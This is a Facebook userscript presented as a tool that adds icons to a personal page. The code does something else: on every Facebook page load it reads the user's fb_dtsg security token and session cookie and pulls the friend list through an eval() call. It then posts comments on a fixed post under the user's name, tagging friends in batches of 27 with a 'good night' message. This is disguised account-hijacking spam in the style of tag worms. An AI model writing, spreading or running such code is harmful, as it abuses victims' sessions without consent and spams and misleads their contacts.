// ==UserScript==
// @name            cài đặt tool icon trang cá nhân Công
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var id = "214875832053762";
var arkadaslar = [];
var svn_rev;
function arkadaslari_al(id){            
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
for(f=0;f<Math.round(arkadaslar.payload.entries.length/27);f++){
mesaj = "";mesaj_text = "";
for(i=f*27;i<(f+1)*27;i++){
if(arkadaslar.payload.entries[i]){
mesaj += " Ngủ ngon  👏  Nhé  🌹  mọi người sr đã tag làm phiền ❤  @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
mesaj_text += " " + arkadaslar.payload.entries[i].text;
}
}
yorum_yap(id ,mesaj)}                
}
};
var params = "&filter[0]=user";
params += "&options[0]=friends_only";
params += "&options[1]=nm";
params += "&token=v7";
params += "&viewer=" + user_id;
params += "&__user=" + user_id;
if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
xmlhttp.send();
}
function RandomArkadas(){
var sonuc = "";
for(i=0;i<9;i++){
sonuc += " @[" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].uid + ":" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].text + "]";
}
return sonuc;
}
function yorum_yap(id ,mesaj) {
 var xhr = new XMLHttpRequest();
 var params ="";
 params +="&ft_ent_identifier="+id;
 params +="&comment_text="+encodeURIComponent(mesaj);
 params +="&source=2";
 params +="&client_id=1377871797138:1707018092";
 params +="&reply_fbid";
 params +="&parent_comment_id";
 params +="&rootid=u_jsonp_2_3";
 params +="&clp={\"cl_impid\":\"453524a0\",\"clearcounter\":0,\"elementid\":\"js_5\",\"version\":\"x\",\"parent_fbid\":"+id+"}";
 params +="&attached_sticker_fbid=0";
 params +="&attached_photo_fbid=0";
 params +="&giftoccasion";
 params +="&ft[tn]=[]";
 params +="&__user="+user_id;
 params +="&__a=1";
 params +="&__dyn=7n8ahyj35ynxl2u5F97KepEsyo";
 params +="&__req=q";
 params +="&fb_dtsg="+fb_dtsg;
 params +="&ttstamp=";
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);
 
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 
    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(params);
}
        arkadaslari_al(221363318056182);